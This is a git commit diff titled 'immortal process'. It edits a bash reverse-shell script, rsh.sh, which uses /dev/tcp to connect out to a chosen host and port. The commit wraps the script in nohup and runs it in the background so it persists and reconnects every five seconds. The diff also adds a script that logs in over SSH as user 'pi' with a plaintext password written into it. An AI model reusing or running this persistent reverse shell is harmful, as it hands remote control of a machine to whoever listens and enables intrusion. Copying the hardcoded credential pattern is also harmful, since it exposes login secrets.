0769a6044cbc5b7c7cd018757fa11322f92a527e
toyo <yuma@happy-quality.jp>
2021-06-11 16:56:30 +0900

    [add] immortal process

--- rsh.sh
+++ rsh.sh
@@ -1,4 +1,4 @@
 #! /bin/bash
 
-while true; do /bin/bash -i >& /dev/tcp/${1:-127.0.0.1}/${2:-8080} 0>&1; sleep 5; done
+nohup bash -c "while true; do /bin/bash -i >& /dev/tcp/${1:-127.0.0.1}/${2:-8080} 0>&1; sleep 5; done" > /dev/null 2>&1 &
 
---
+++ sshpass.sh
@@ -0,0 +1,4 @@
+#! /bin/bash
+
+sshpass -p password ssh -l pi 192.168.11.150
+
